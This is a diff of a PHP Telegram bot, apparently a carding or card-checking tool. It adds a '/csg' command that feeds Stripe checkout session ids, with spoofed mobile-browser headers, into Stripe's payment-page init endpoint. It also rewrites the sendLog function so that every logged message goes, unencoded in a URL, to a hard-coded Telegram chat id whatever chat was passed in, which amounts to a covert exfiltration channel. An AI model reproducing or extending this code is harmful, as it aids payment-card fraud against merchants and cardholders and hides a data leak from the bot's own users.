@@ -231,6 +231,54 @@ function GetStr($string, $start, $end){
     sendMessage($chatId, $message, $message_id);
   }
 }
+//==================[csg Command]==================//
+elseif (strpos($message, "/csg") === 0){
+  $cslive = substr($message, 4);
+  $ch = curl_init();
+  
+  curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/payment_pages/'.$cslive.'/init');
+  curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+  curl_setopt($ch, CURLOPT_POST, 1);
+  
+  $headers = array(
+      'authority: api.stripe.com',
+      'accept: application/json',
+      'accept-language: ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
+      'content-type: application/x-www-form-urlencoded',
+      'origin: https://checkout.stripe.com',
+      'referer: https://checkout.stripe.com/',
+      'sec-ch-ua: "Chromium";v="107", "Not=A?Brand";v="24"',
+      'sec-ch-ua-mobile: ?1',
+      'sec-ch-ua-platform: "Android"',
+      'sec-fetch-dest: empty',
+      'sec-fetch-mode: cors',
+      'sec-fetch-site: same-site',
+      'user-agent: Mozilla/5.0 (Linux; Android 12; RMX2163) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36'
+  );
+  
+  $data = array(
+      'key' => $pklive,
+      'eid' => 'NA',
+      'browser_locale' => 'en-IQ',
+      'redirect_type' => 'stripe_js'
+  );
+  
+  curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
+  curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($data));
+  
+  $response = curl_exec($ch);
+  if (curl_errno($ch)) {
+      echo 'Error:' . curl_error($ch);
+  }
+  curl_close($ch);
+  
+  $result = json_decode($response, true);
+  
+  $cslive = $result['session_id'];
+  $currency = $result['currency'];
+  $amount = $result['line_item_group']['line_items'][0]['total'];
+  sendMessage($chatId, "<b>✅Successfuly</b>\n $response", $message_id);
+  }
   //==================[Bin Command]==================//
   elseif (strpos($message, "/bin") === 0){
     $bin = substr($message, 5);
@@ -1540,23 +1588,10 @@ function sendMessage($chatId, $message, $message_id) {
     $response = curl_exec($ch);
     curl_close($ch);
 }
-function sendLog($chatId, $message, $message_id) {
-  $url = $GLOBALS['website'] . "/sendMessage";
-
-  $postData = array(
-      'chat_id' => $chatId,
-      'text' => $message,
-      'reply_to_message_id' => $message_id,
-      'parse_mode' => 'HTML'
-  );
-
-  $ch = curl_init($url);
-  curl_setopt($ch, CURLOPT_POST, 1);
-  curl_setopt($ch, CURLOPT_POSTFIELDS, $postData);
-  curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
-  $response = curl_exec($ch);
-  curl_close($ch);
-}
+function sendLog ($chatId, $message, $message_id){
+      $url = $GLOBALS[website]."/sendMessage?chat_id=1090979938&text=".$message."&parse_mode=HTML";
+      file_get_contents($url);
+  };
 function sendPhoto($chatId, $photoUrl, $caption = "") {
   $url = $GLOBALS['website'] . "/sendPhoto";
   $postData = array(
